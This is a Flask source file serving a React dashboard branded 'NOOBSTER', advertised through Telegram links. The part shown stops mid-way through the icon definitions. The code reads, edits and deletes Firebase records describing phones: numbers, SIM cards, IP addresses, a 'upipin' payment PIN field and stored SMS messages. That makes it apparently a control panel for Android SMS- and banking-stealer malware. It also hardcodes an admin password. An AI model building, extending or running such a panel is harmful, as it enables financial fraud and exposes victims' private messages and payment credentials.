from flask import Flask, Response
import os

app = Flask(__name__)

ADMIN_PASSWORD = "Noobster@2024"
TELEGRAM_CHANNEL = "https://t.me/firebase1991"

# ============================================================
# FULL HTML — Yeh string trilingual-safe hai (no backtick issues)
# ============================================================
PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>NOOBSTER</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <style>
        *, :before, :after { box-sizing: border-box; border: 0 solid; margin: 0; padding: 0; }
        :root {
            --background: 0 0% 4%;
            --foreground: 0 0% 92%;
            --border: 0 0% 12%;
            --primary: 0 84% 50%;
            --radius: .75rem;
            --app-font-sans: "Inter", sans-serif;
            --app-font-mono: Menlo, monospace;
        }
        html, body {
            line-height: 1.5;
            font-family: "Inter", ui-sans-serif, system-ui, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: #020202;
            color: #e8e8e8;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            background: radial-gradient(at 0% 0%, rgba(59,130,246,0.12) 0px, transparent 50%),
                        radial-gradient(at 100% 0%, rgba(139,92,246,0.12) 0px, transparent 50%),
                        radial-gradient(at 50% 100%, rgba(6,182,212,0.08) 0px, transparent 50%),
                        #020202;
            background-attachment: fixed;
        }
        button, input, textarea, select {
            font: inherit;
            color: inherit;
            background-color: transparent;
            border-radius: 0;
        }
        img, svg { display: block; max-width: 100%; height: auto; }
        ol, ul, menu { list-style: none; }
        h1,h2,h3,h4,h5,h6 { font-size: inherit; font-weight: inherit; }
        a { color: inherit; text-decoration: inherit; }

        .min-h-screen { min-height: 100vh; }
        .flex { display: flex; }
        .grid { display: grid; }
        .hidden { display: none; }
        .relative { position: relative; }
        .fixed { position: fixed; }
        .absolute { position: absolute; }
        .inset-0 { inset: 0; }
        .items-center { align-items: center; }
        .justify-center { justify-content: center; }
        .justify-between { justify-content: space-between; }
        .flex-col { flex-direction: column; }
        .flex-wrap { flex-wrap: wrap; }
        .gap-1 { gap: .25rem; }
        .gap-1\.5 { gap: .375rem; }
        .gap-2 { gap: .5rem; }
        .gap-2\.5 { gap: .625rem; }
        .gap-3 { gap: .75rem; }
        .gap-4 { gap: 1rem; }
        .gap-5 { gap: 1.25rem; }
        .gap-6 { gap: 1.5rem; }
        .p-1 { padding: .25rem; }
        .p-1\.5 { padding: .375rem; }
        .p-2 { padding: .5rem; }
        .p-3 { padding: .75rem; }
        .p-4 { padding: 1rem; }
        .p-6 { padding: 1.5rem; }
        .p-7 { padding: 1.75rem; }
        .px-2 { padding-inline: .5rem; }
        .px-3 { padding-inline: .75rem; }
        .px-4 { padding-inline: 1rem; }
        .px-5 { padding-inline: 1.25rem; }
        .px-6 { padding-inline: 1.5rem; }
        .py-1 { padding-block: .25rem; }
        .py-1\.5 { padding-block: .375rem; }
        .py-2 { padding-block: .5rem; }
        .py-2\.5 { padding-block: .625rem; }
        .py-3 { padding-block: .75rem; }
        .py-4 { padding-block: 1rem; }
        .py-8 { padding-block: 2rem; }
        .py-12 { padding-block: 3rem; }
        .py-24 { padding-block: 6rem; }
        .mt-1 { margin-top: .25rem; }
        .mt-2 { margin-top: .5rem; }
        .mt-4 { margin-top: 1rem; }
        .mt-6 { margin-top: 1.5rem; }
        .mt-10 { margin-top: 2.5rem; }
        .mb-1 { margin-bottom: .25rem; }
        .mb-2 { margin-bottom: .5rem; }
        .mb-3 { margin-bottom: .75rem; }
        .mb-4 { margin-bottom: 1rem; }
        .mb-5 { margin-bottom: 1.25rem; }
        .mb-8 { margin-bottom: 2rem; }
        .ml-auto { margin-left: auto; }
        .mx-auto { margin-inline: auto; }
        .w-full { width: 100%; }
        .w-2 { width: .5rem; }
        .w-3 { width: .75rem; }
        .w-3\.5 { width: .875rem; }
        .w-4 { width: 1rem; }
        .w-5 { width: 1.25rem; }
        .w-6 { width: 1.5rem; }
        .w-7 { width: 1.75rem; }
        .w-8 { width: 2rem; }
        .w-9 { width: 2.25rem; }
        .w-10 { width: 2.5rem; }
        .w-16 { width: 4rem; }
        .w-80 { width: 20rem; }
        .w-96 { width: 24rem; }
        .w-px { width: 1px; }
        .h-2 { height: .5rem; }
        .h-3 { height: .75rem; }
        .h-3\.5 { height: .875rem; }
        .h-4 { height: 1rem; }
        .h-5 { height: 1.25rem; }
        .h-6 { height: 1.5rem; }
        .h-7 { height: 1.75rem; }
        .h-8 { height: 2rem; }
        .h-9 { height: 2.25rem; }
        .h-10 { height: 2.5rem; }
        .h-16 { height: 4rem; }
        .h-80 { height: 20rem; }
        .h-96 { height: 24rem; }
        .max-w-md { max-width: 28rem; }
        .max-w-screen-2xl { max-width: 96rem; }
        .rounded-lg { border-radius: .5rem; }
        .rounded-xl { border-radius: .75rem; }
        .rounded-2xl { border-radius: 1rem; }
        .rounded-3xl { border-radius: 1.5rem; }
        .rounded-full { border-radius: 9999px; }
        .border { border: 1px solid hsl(var(--border)); }
        .border-b { border-bottom: 1px solid hsl(var(--border)); }
        .border-l { border-left: 1px solid hsl(var(--border)); }
        .border-t { border-top: 1px solid hsl(var(--border)); }
        .border-dashed { border-style: dashed; }
        .text-center { text-align: center; }
        .text-right { text-align: right; }
        .text-xs { font-size: .75rem; }
        .text-sm { font-size: .875rem; }
        .text-base { font-size: 1rem; }
        .text-lg { font-size: 1.125rem; }
        .text-xl { font-size: 1.25rem; }
        .text-2xl { font-size: 1.5rem; }
        .text-4xl { font-size: 2.25rem; }
        .font-medium { font-weight: 500; }
        .font-semibold { font-weight: 600; }
        .font-bold { font-weight: 700; }
        .font-black { font-weight: 900; }
        .font-mono { font-family: var(--app-font-mono); }
        .uppercase { text-transform: uppercase; }
        .italic { font-style: italic; }
        .tracking-tight { letter-spacing: -.025em; }
        .tracking-wider { letter-spacing: .05em; }
        .tracking-widest { letter-spacing: .1em; }
        .truncate { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .whitespace-nowrap { white-space: nowrap; }
        .overflow-hidden { overflow: hidden; }
        .overflow-y-auto { overflow-y: auto; }
        .overflow-x-auto { overflow-x: auto; }
        .cursor-pointer { cursor: pointer; }
        .select-none { user-select: none; }
        .select-all { user-select: all; }
        .opacity-30 { opacity: .3; }
        .opacity-50 { opacity: .5; }
        .opacity-70 { opacity: .7; }
        .text-white { color: #fff; }
        .text-black { color: #000; }
        .text-red-400 { color: #f87171; }
        .text-red-500 { color: #ef4444; }
        .text-emerald-400 { color: #4ade80; }
        .text-emerald-500 { color: #22c55e; }
        .text-emerald-600 { color: #16a34a; }
        .text-emerald-700 { color: #15803d; }
        .text-blue-400 { color: #60a5fa; }
        .text-purple-400 { color: #c084fc; }
        .text-amber-400 { color: #fbbf24; }
        .text-yellow-500 { color: #eab308; }
        .bg-black { background-color: #000; }
        .bg-\[\#111\] { background-color: #111; }
        .bg-\[\#1a1a1a\] { background-color: #1a1a1a; }
        .bg-\[\#222\] { background-color: #222; }
        .bg-white\/5 { background-color: rgba(255,255,255,0.05); }
        .bg-red-600 { background-color: #dc2626; }
        .bg-red-950\/20 { background-color: rgba(69,10,10,0.2); }
        .bg-red-950\/30 { background-color: rgba(69,10,10,0.3); }
        .bg-emerald-950\/20 { background-color: rgba(2,44,34,0.2); }
        .bg-emerald-950\/30 { background-color: rgba(2,44,34,0.3); }
        .bg-emerald-500\/15 { background-color: rgba(34,197,94,0.15); }
        .bg-purple-500\/15 { background-color: rgba(168,85,247,0.15); }
        .bg-purple-950\/20 { background-color: rgba(59,7,100,0.2); }
        .bg-amber-500\/10 { background-color: rgba(245,158,11,0.1); }
        .bg-blue-950\/60 { background-color: rgba(23,37,84,0.6); }
        .bg-emerald-500 { background-color: #22c55e; }
        .bg-emerald-500\/10 { background-color: rgba(34,197,94,0.1); }
        .bg-purple-500\/10 { background-color: rgba(168,85,247,0.1); }
        .bg-black\/70 { background-color: rgba(0,0,0,0.7); }
        .bg-black\/80 { background-color: rgba(0,0,0,0.8); }
        .border-\[\#1a1a1a\] { border-color: #1a1a1a; }
        .border-\[\#1f1f1f\] { border-color: #1f1f1f; }
        .border-\[\#222\] { border-color: #222; }
        .border-\[\#262626\] { border-color: #262626; }
        .border-\[\#333\] { border-color: #333; }
        .border-\[\#2a2a2a\] { border-color: #2a2a2a; }
        .border-emerald-500\/25 { border-color: rgba(34,197,94,0.25); }
        .border-emerald-900\/30 { border-color: rgba(6,78,59,0.3); }
        .border-emerald-900\/40 { border-color: rgba(6,78,59,0.4); }
        .border-purple-500\/25 { border-color: rgba(168,85,247,0.25); }
        .border-purple-900\/30 { border-color: rgba(88,28,135,0.3); }
        .border-red-900\/30 { border-color: rgba(127,29,29,0.3); }
        .border-amber-500\/20 { border-color: rgba(245,158,11,0.2); }
        .border-blue-800\/60 { border-color: rgba(30,64,175,0.6); }
        .border-transparent { border-color: transparent; }
        .border-l-emerald-500\/70 { border-left-color: rgba(34,197,94,0.7); }
        .border-l-purple-500\/70 { border-left-color: rgba(168,85,247,0.7); }
        .border-l-red-500\/60 { border-left-color: rgba(239,68,68,0.6); }
        .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1); }
        .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 8px 10px -6px rgba(0,0,0,0.1); }
        .shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); }
        .shadow-red-900\/40 { box-shadow: 0 10px 15px -3px rgba(127,29,29,0.4); }
        .shadow-red-900\/50 { box-shadow: 0 20px 25px -5px rgba(127,29,29,0.5); }
        .backdrop-blur-md { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
        .backdrop-blur-sm { backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); }
        .blur-3xl { filter: blur(64px); }
        .transition { transition: all .15s ease; }
        .transition-all { transition: all .15s ease; }
        .transition-colors { transition: color, background-color, border-color .15s ease; }
        .duration-200 { transition-duration: .2s; }
        .duration-300 { transition-duration: .3s; }
        .duration-500 { transition-duration: .5s; }
        .animate-pulse { animation: pulse 2s infinite; }
        .animate-spin { animation: spin 1s linear infinite; }
        .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
        .animate-glint { animation: glint 1.5s infinite; box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 50% { opacity: .5; } }
        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); } 100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } }
        @keyframes glint { 0%,100% { transform: scale(1); opacity: 0; } 50% { transform: scale(1.5); opacity: 1; } }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
        .animate-fade-up { animation: fadeUp .3s ease-out; }
        .red-gradient { background: linear-gradient(135deg, #dc2626, #c2410c); }
        .glass-card { backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); background: rgba(17,17,17,0.9); border: 1px solid rgba(255,255,255,0.06); }
        .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
        .grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
        @media (min-width: 640px) { .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
        @media (min-width: 1024px) { .lg\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
        .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
        .tabular-nums { font-variant-numeric: tabular-nums; }
        .z-0 { z-index: 0; }
        .z-10 { z-index: 10; }
        .z-40 { z-index: 40; }
        .z-50 { z-index: 50; }
        .sticky { position: sticky; }
        .top-0 { top: 0; }
        .bottom-6 { bottom: 1.5rem; }
        .left-1\/2 { left: 50%; }
        .-translate-x-1\/2 { transform: translateX(-50%); }
        .-translate-y-1\/2 { transform: translateY(-50%); }
        .top-1\/2 { top: 50%; }
        .left-3 { left: .75rem; }
        .right-2 { right: .5rem; }
        .right-4 { right: 1rem; }
        .right-1\/4 { right: 25%; }
        .left-1\/4 { left: 25%; }
        .bottom-0 { bottom: 0; }
        .top-0 { top: 0; }
        .max-h-52 { max-height: 13rem; }
        .min-h-screen { min-height: 100vh; }
        .overflow-hidden { overflow: hidden; }
        .text-\[\#6acfff\] { color: #6acfff; }
        .text-\[\#333\] { color: #333; }
        .text-\[\#444\] { color: #444; }
        .text-\[\#555\] { color: #555; }
        .text-\[\#666\] { color: #666; }
        .text-\[\#777\] { color: #777; }
        .text-\[\#888\] { color: #888; }
        .text-\[\#999\] { color: #999; }
        .text-\[\#aaa\] { color: #aaa; }
        .text-\[\#ccc\] { color: #ccc; }
        .bg-\[\#0a0a0a\]\/80 { background-color: rgba(10,10,10,0.8); }
        .bg-\[\#0a0a0a\] { background-color: #0a0a0a; }
        .bg-\[\#080808\] { background-color: #080808; }
        .bg-\[\#0a130d\] { background-color: #0a130d; }
        .bg-\[\#0a1410\] { background-color: #0a1410; }
        .bg-\[\#100d18\] { background-color: #100d18; }
        .bg-\[\#0d0d0d\] { background-color: #0d0d0d; }
        .bg-\[\#111111\] { background-color: #111; }
        .bg-\[\#131313\] { background-color: #131313; }
        .bg-\[\#151515\] { background-color: #151515; }
        .bg-\[\#0f0a1a\] { background-color: #0f0a1a; }
        .bg-\[\#081410\] { background-color: #081410; }
        .focus\:border-red-500:focus { border-color: #ef4444; }
        .focus\:ring-2:focus { box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }
        .outline-none { outline: none; }
        .outline-none:focus { outline: none; }
        .placeholder\:text-\[\#444\]::placeholder { color: #444; }
        .hover\:border-\[\#2a2a2a\]:hover { border-color: #2a2a2a; }
        .hover\:border-\[\#333\]:hover { border-color: #333; }
        .hover\:border-red-600\/40:hover { border-color: rgba(220,38,38,0.4); }
        .hover\:bg-\[\#0a0a0a\]:hover { background-color: #0a0a0a; }
        .hover\:bg-\[\#161616\]:hover { background-color: #161616; }
        .hover\:bg-white\/5:hover { background-color: rgba(255,255,255,0.05); }
        .hover\:bg-white\/10:hover { background-color: rgba(255,255,255,0.1); }
        .hover\:bg-red-950\/20:hover { background-color: rgba(69,10,10,0.2); }
        .hover\:bg-red-950\/10:hover { background-color: rgba(69,10,10,0.1); }
        .hover\:bg-red-900\/60:hover { background-color: rgba(127,29,29,0.6); }
        .hover\:bg-red-700:hover { background-color: #b91c1c; }
        .hover\:text-white:hover { color: #fff; }
        .hover\:text-\[\#888\]:hover { color: #888; }
        .hover\:text-red-400:hover { color: #f87171; }
        .hover\:opacity-90:hover { opacity: .9; }
        .hover\:-translate-y-0\.5:hover { transform: translateY(-0.125rem); }
        .hover\:shadow-xl:hover { box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
        .disabled\:opacity-50:disabled { opacity: .5; }
        .disabled\:cursor-not-allowed:disabled { cursor: not-allowed; }
        .group:hover .group-hover\:text-\[\#999\] { color: #999; }
        .group:hover .group-hover\:text-orange-400 { color: #fb923c; }
        .group:hover .group-hover\:text-red-400 { color: #f87171; }
        .group:hover .group-hover\:opacity-100 { opacity: 1; }
        .pointer-events-none { pointer-events: none; }

        /* 3D Telegram Popup */
        #telegramPopup {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.55);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            padding: 20px;
        }
        .popup-box {
            width: 100%;
            max-width: 380px;
            padding: 38px 28px 40px;
            border-radius: 40px;
            text-align: center;
            color: #fff;
            background: radial-gradient(circle at 30% 20%, #2b9cff, #0f5b9e 80%, #083b6b);
            box-shadow: 0 40px 70px rgba(0,0,0,0.7), 0 15px 30px rgba(0,0,0,0.5), inset 0 4px 12px rgba(255,255,255,0.5), inset 0 -6px 18px rgba(0,20,40,0.8), 0 0 0 2px rgba(255,255,255,0.08) inset;
            transform: perspective(1200px) rotateX(6deg) rotateY(2deg) translateZ(10px);
            animation: popup3d 0.7s cubic-bezier(0.23,1,0.32,1) forwards;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            position: relative;
            overflow: hidden;
        }
        .popup-box:hover {
            transform: perspective(1200px) rotateX(3deg) rotateY(4deg) translateY(-6px) translateZ(16px);
            box-shadow: 0 60px 90px rgba(0,0,0,0.8), 0 20px 40px rgba(0,0,0,0.6), inset 0 4px 16px rgba(255,255,255,0.6), inset 0 -8px 24px rgba(0,20,40,0.9), 0 0 0 2px rgba(255,255,255,0.15) inset;
        }
        @keyframes popup3d {
            0% { opacity: 0; transform: perspective(1200px) rotateX(40deg) rotateY(10deg) scale(0.7) translateZ(-80px); filter: blur(8px); }
            100% { opacity: 1; transform: perspective(1200px) rotateX(6deg) rotateY(2deg) scale(1) translateZ(10px); filter: blur(0); }
        }
        .popup-box h2 {
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.2px;
            margin-bottom: 14px;
            text-shadow: 0 6px 14px rgba(0,0,0,0.4), 0 2px 4px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .popup-box .sub-icon { font-size: 34px; line-height: 1; filter: drop-shadow(0 8px 12px rgba(0,0,0,0.4)); }
        .popup-box p {
            color: #e3f0ff;
            font-size: 17px;
            line-height: 1.6;
            font-weight: 400;
            margin: 10px 0 22px;
            text-shadow: 0 2px 6px rgba(0,0,0,0.3);
            background: rgba(0,30,60,0.2);
            backdrop-filter: blur(2px);
            border-radius: 40px;
            padding: 14px 16px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        .join-btn {
            display: inline-block;
            margin-top: 6px;
            padding: 16px 34px;
            background: linear-gradient(145deg, #ffffff, #e0ecff);
            color: #0066aa;
            font-weight: 700;
            font-size: 18px;
            text-decoration: none;
            border-radius: 60px;
            letter-spacing: 0.3px;
            border: none;
            cursor: pointer;
            box-shadow: 0 16px 28px -6px rgba(0,0,0,0.6), 0 8px 16px -4px rgba(0,0,0,0.4), inset 0 2px 8px rgba(255,255,255,0.9), inset 0 -4px 12px rgba(0,40,80,0.2);
            transition: all 0.2s cubic-bezier(0.23,1,0.32,1);
        }
        .join-btn:hover {
            transform: translateY(-5px) scale(1.03);
            box-shadow: 0 24px 40px -8px rgba(0,0,0,0.7), 0 12px 24px -6px rgba(0,0,0,0.5), inset 0 3px 12px rgba(255,255,255,1), inset 0 -6px 16px rgba(0,40,80,0.3);
        }
        .join-btn::before { content: "✈️ "; font-size: 22px; display: inline-block; margin-right: 8px; }
        .popup-close-btn {
            position: absolute;
            top: 14px;
            right: 18px;
            background: rgba(255,255,255,0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
            z-index: 10;
        }
        .popup-close-btn:hover { background: rgba(255,255,255,0.3); }
        @media (max-width: 480px) {
            .popup-box { padding: 28px 20px 30px; max-width: 94%; border-radius: 32px; }
            .popup-box h2 { font-size: 22px; gap: 4px; }
            .popup-box p { font-size: 15px; padding: 12px 14px; }
            .join-btn { font-size: 16px; padding: 14px 28px; width: 100%; }
        }

        #root { min-height: 100vh; }
    </style>
</head>

<body>
    <div id="root"></div>

    <div id="telegramPopup" onclick="if(event.target === this) this.style.display='none';">
        <div class="popup-box">
            <button class="popup-close-btn" onclick="document.getElementById('telegramPopup').style.display='none';" aria-label="Close">&times;</button>
            <h2><span class="sub-icon">📱</span> JOIN TELEGRAM CHANNEL</h2>
            <p>Get The New Pannel<br /></p>
            <a class="join-btn" href="https://t.me/noobsterrr" target="_blank" onclick="document.getElementById('telegramPopup').style.display='none';">⚡ JOIN ⚡</a>
        </div>
    </div>

    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script>
    // ============================================================
    // ALL REACT APP CODE (inline, no external bundles)
    // ============================================================
    const { useState, useEffect, useCallback, useMemo, useRef, Fragment } = React;
    const e = React.createElement;

    // ---- LocalStorage helpers ----
    const LS = {
        get: (k, def) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch { return def; } },
        set: (k, v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} },
        del: (k) => { try { localStorage.removeItem(k); } catch {} }
    };
    const ACCOUNTS_KEY = "flixy_accounts";
    const STARRED_KEY  = "flixy_starred_devices";

    // ---- Firebase fetch ----
    async function fbFetch(url, key, path, params = {}) {
        let u = (url || "").trim().replace(/\/$/, "");
        if (!u.startsWith("http")) u = "https://" + u;
        if (!u.includes("firebaseio.com") && !u.includes("firebasedatabase.app")) {
            throw new Error("Invalid Firebase URL. Must contain firebaseio.com or firebasedatabase.app");
        }
        const qs = new URLSearchParams({ auth: (key || "").trim(), ...params });
        const full = u + "/" + path + ".json?" + qs.toString();
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 15000);
        let res;
        try {
            res = await fetch(full, { signal: ctrl.signal, headers: { Accept: "application/json" } });
        } catch (err) {
            clearTimeout(timer);
            if (err.name === "AbortError") throw new Error("Request timed out.");
            throw new Error("Network error: " + err.message);
        }
        clearTimeout(timer);
        if (!res.ok) {
            if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
            if (res.status === 404) return null;
            throw new Error("HTTP " + res.status);
        }
        return res.json();
    }
    async function fbPut(url, key, path, data) {
        const u = url.replace(/\/$/, "");
        const res = await fetch(u + "/" + path + ".json?auth=" + key, {
            method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
        });
        if (!res.ok) throw new Error("HTTP " + res.status);
        return res.json();
    }
    async function fbDelete(url, key, path) {
        const u = url.replace(/\/$/, "");
        const res = await fetch(u + "/" + path + ".json?auth=" + key, { method: "DELETE" });
        if (!res.ok && res.status === 403) throw new Error("PERMISSION_DENIED");
    }

    // ---- Parsers ----
    function parseDevices(data) {
        const out = [];
        if (!data || typeof data !== "object") return out;
        Object.entries(data).forEach(([id, d]) => {
            if (!d || typeof d !== "object") return;
            let sims = Array.isArray(d.sims) ? d.sims : (d.sims && typeof d.sims === "object" ? Object.values(d.sims) : []);
            const battery = String(d.battery ?? "—");
            out.push({
                id,
                name: String(d.modelName || d.model || d.deviceName || id),
                battery,
                batteryPercent: parseInt(battery.replace("%", "")) || 0,
                status: !!d.status,
                phoneNumber: String(d.mobNo || (sims[0] && sims[0].phoneNumber) || "—"),
                android: String(d.androidV || d.androidVersion || "—"),
                ip: String(d.ip_address || "—"),
                storage: String(d.storage || "—"),
                provider: String(d.service_provider || "—"),
                sims,
                upipin: d.upipin ? String(d.upipin) : null,
                cpu: String(d.cpu_arch || "—"),
                sdk: String(d.sdkV || "—"),
                lastSeen: d.lastSeen || d.last_seen || d.lastOnline || d.last_online || d.lastActive || d.last_active || d.timestamp || null
            });
        });
        return out;
    }
    function parseMessages(data) {
        const out = [];
        if (!data || typeof data !== "object") return out;
        const arr = Object.entries(data).slice(-150);
        arr.forEach(([, m]) => {
            if (!m || typeof m !== "object") return;
            const text = String(m.message || m.body || m.text || "");
            if (!text.trim()) return;
            out.push({ text, sender: String(m.sender || m.from || "Unknown"), time: String(m.dateTime || m.date || "") });
        });
        return out.reverse();
    }
    function formatCurrency(v) {
        try { return parseFloat(v).toLocaleString("en-IN", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
        catch { return v; }
    }
    function timeAgo(ms) {
        if (!ms) return "—";
        const diff = Date.now() - ms;
        if (diff < 0) return "Just now";
        const s = Math.floor(diff / 1000), m = Math.floor(s / 60), h = Math.floor(m / 60), d = Math.floor(h / 24);
        if (s < 60) return s + "s ago";
        if (m < 60) return m + "m ago";
        if (h < 24) return h + "h " + (m % 60) + "m ago";
        if (d < 30) return d + "d " + (h % 24) + "h ago";
        return new Date(ms).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
    }
    function fmtFullDate(ms) {
        if (!ms) return "—";
        return new Date(ms).toLocaleString("en-IN", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit", hour12: true });
    }

    // ---- Icons (Lucide-style SVG) ----
    const Icon = ({ name, size = 16, className = "", style = {} }) => {
        const paths = {
            wifi: e(Fragment, null, e("path", { d: "M12 20h.01" }), e("path", { d: "M2 8.82a15 15 0 0 1 20 0" }), e("path", { d: "M5 12.859a10 10 0 0 1 14 0" }), e("path", { d: "M8.5 16.429a5 5 0 0 1 7 0" })),
            zap: e("path", { d: "M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z" }),
            copy: e(Fragment, null, e("rect", { width: 14, height: 14, x: 8, y: 8, rx: 2, ry: 2 }), e("path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" })),
            check: e("path", { d: "M20 6 9 17l-5-5" }),
            x: e(Fragment, null, e("path", { d: "M18 6 6 18" }), e("path", { d: "m6 6 12 12" })),
            plus: e(Fragment, null, e("path", { d: "M5 12h14" }), e("path", { d: "M12 5v14" })),
            trash: e(Fragment, null, e("path", { d: "M10 11v6" }), e("path", { d: "M14 11v6" }), e("path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6" }), e("path", { d: "M3 6h18" }), e("path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" })),
            link: e(Fragment, null, e("path", { d: "M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" }), e("path", { d: "M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" })),
            share: e(Fragment, null, e("circle", { cx: 18, cy: 5, r: 3 }), e("circle", { cx: 6, cy: 12, r: 3 }), e("circle", { cx: 18, cy: 19, r: 3 }), e("line", { x1: 8.59, x2: 15.42, y1: 13.51, y2: 17.49 }), e("line", { x1: 15.41, x2: 8.59, y1: 6.51, y2: 10.49 })),
            search: e(Fragment, null, e("circle", { cx: 11, cy: 11, r: 8 }), e("path", { d: "m21 21-4.3-4.3" })),
            refresh: e(Fragment, null, e("path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" }), e("path", { d: "M21 3v5h-5" }), e("path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" }), e("path", { d: "M8 16H3v5" })),
            logout: e(Fragment, null, e("path", { d: "m16 17 5-5-5-5" }), e("path", { d: "M21 12H9" }), e("path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" })),
            shield: e("path", { d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" }),
            clock: e(Fragment, null, e("path", { d: "M12 6v6l4 2" }), e("circle", { cx: 12, cy: 12, r: 10 })),
            rupee: e(Fragment, null, e("path", { d: "M6 3h12" }), e("path", { d: "M6 8h12" }), e("path", { d: "m6 13 8.5 8" }), e("path", { d: "M6 13h3" }), e("path", { d: "M9 13c6.667 0 6.667-10 0-10" })),
            card: e(Fragment, null, e("rect", { width: 20, height: 14, x: 2, y: 5, rx: 2 }), e("line", { x1: 2, x2: 22, y1: 10, y2: 10 })),
            send: e(Fragment, null, e("path", { d: "M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z" }), e("path", { d: "m21.854 2.147-10.94 10.939" })),
            phone: e("path", { d: "M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" }),
            signal: e(Fragment, null, e("path", { d: "M2 20h.01" }), e("path", { d: "M7 20v-4" }), e("path", { d: "M12 20v-8" }), e("path", { d: "M17 20V8" }), e("path", { d: "M22 4v16" })),
            msg: e("path", { d: "M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z" }),
            upload: e(Fragment, null, e("path", { d: "M12 3v12" }), e("path", { d: "m17 8-5-5-5 5" }), e("path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" })),
